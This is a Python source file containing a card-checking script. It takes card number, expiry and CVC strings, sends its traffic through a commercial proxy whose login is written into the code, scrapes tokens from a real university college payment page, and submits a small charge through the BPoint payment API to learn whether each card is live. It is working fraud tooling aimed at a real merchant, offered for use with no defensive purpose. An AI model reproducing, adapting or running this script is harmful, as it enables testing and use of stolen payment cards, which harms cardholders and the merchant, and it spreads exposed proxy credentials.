import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.google.com/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'cross-site',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = session.get('https://www.stleos.uq.edu.au/make-a-payment-bpoint/', headers=headers)
	
	authorization = re.search(r'"authorization":"(.*?)"', response.text).group(1)
	#print(authorization)
	billerCode = re.search(r'name="billerCode" value="(.*?)"', response.text).group(1)
	#print(billerCode)
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Authorization': f'{authorization}',
	    'Connection': 'keep-alive',
	    # 'Content-Length': '0',
	    'Content-Type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = session.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
	
	authkey = response.json()['authkey']
	#print(authkey)
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Authorization': f'{authorization}',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'action': 'Payment',
	    'type': 'ECommerce',
	    'subType': 'Single',
	    'amount': 100,
	    'billerCode': f'{billerCode}',
	    'crn1': '1',
	    'crn2': '',
	    'crn3': '',
	    'merchantReference': '',
	    'currency': 'AUD',
	    'bypass3ds': False,
	    'tokenisationMode': 'Default',
	    'emailAddress': '',
	    'storeCard': True,
	    'testMode': False,
	}
	
	response = requests.put(
	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/txn-details',
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'card': {
	        'number': n,
	        'expiry': {
	            'month': f'{mm}',
	            'year': yy,
	        },
	        'name': 'Dao Khao Saard',
	        'cvn': f'{cvc}',
	    },
	}
	
	response = requests.put(
	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/client/payment-method',
	    headers=headers,
	    json=json_data,
	)
	
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Authorization': f'{authorization}',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://www.stleos.uq.edu.au',
	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'webhook': {
	        'url': 'https://stleo.wtdevsite.com/make-a-payment-bpoint/',
	        'version': '5',
	    },
	    'surcharge': {
	        'calculate': False,
	        'amount': 0,
	    },
	    'updateToken': True,
	}
	
	response = session.post(
	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/process',
	    headers=headers,
	    json=json_data,
	)
	
	result = re.search(r'"responseText":"(.*?)"', response.text).group(1)
	return (result)
